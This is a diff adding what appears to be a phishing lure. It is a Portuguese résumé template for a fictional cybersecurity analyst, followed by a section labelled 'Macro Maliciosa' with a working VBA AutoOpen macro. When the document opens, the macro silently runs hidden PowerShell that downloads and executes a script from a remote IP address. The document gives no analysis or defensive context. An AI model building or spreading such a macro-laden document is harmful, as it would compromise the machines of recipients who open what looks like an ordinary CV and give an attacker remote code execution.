@@ -1,0 +1,68 @@
+Conteúdo:
+INFORMAÇÕES PESSOAIS:
+
+Nome: John Doe Roberto
+Endereço: Rua Segura, 456, Bairro Protegido, Cidade Segura
+Telefone: (11) 19788-4321
+E-mail: john.roberto@email.com
+LinkedIn: linkedin.com/in/johndoeroberto
+OBJETIVO:
+Busco oportunidades profissionais na área de Cibersegurança, aplicando meus conhecimentos em proteção de dados e sistemas, visando fortalecer a segurança digital de organizações.
+
+EDUCAÇÃO:
+
+Bacharelado em Segurança da Informação
+Universidade da Proteção Digital, Cidade da Tecnologia (20XX-20XX)
+
+Curso Técnico em Redes de Computadores
+Escola Técnica de Segurança Cibernética, Cidade da Inovação (20XX-20XX)
+
+EXPERIÊNCIA PROFISSIONAL:
+
+Analista de Segurança da Informação
+CyberShield Solutions, Cidade Protegida (20XX-presente)
+
+Implementação e monitoramento de soluções de firewall para prevenção de intrusões.
+Investigação e resposta a incidentes de segurança.
+Realização de auditorias de segurança e avaliações de vulnerabilidades.
+Estagiário em Análise de Malware
+CyberTech Labs, Cidade Digital (20XX-20XX)
+
+Análise de código malicioso e comportamento de malware.
+Colaboração na criação de assinaturas de ameaças para sistemas de detecção.
+HABILIDADES:
+
+Segurança de Redes e Sistemas
+Análise de Malware
+Criptografia
+Prevenção e Detecção de Intrusões (IDS/IPS)
+Gerenciamento de Incidentes de Segurança
+Testes de Penetração
+Conformidade e Políticas de Segurança
+IDIOMAS:
+
+Inglês: Avançado
+Espanhol: Intermediário
+CERTIFICAÇÕES:
+
+Certificado em Segurança da Informação (CISSP)
+Certified Ethical Hacker (CEH)
+CompTIA Security+
+PROJETOS PESSOAIS:
+
+Desenvolvimento de uma ferramenta de detecção de intrusões como projeto pessoal (20XX-presente).
+INTERESSES:
+
+Participação ativa em comunidades de segurança cibernética.
+Leitura constante sobre as últimas tendências em ameaças digitais e tecnologias de segurança.
+Colaboração em projetos de código aberto relacionados à segurança da informação.
+
+## Macro Maliciosa
+
+Sub AutoOpen()
+
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.230.130/a'))"""
+
+End Sub
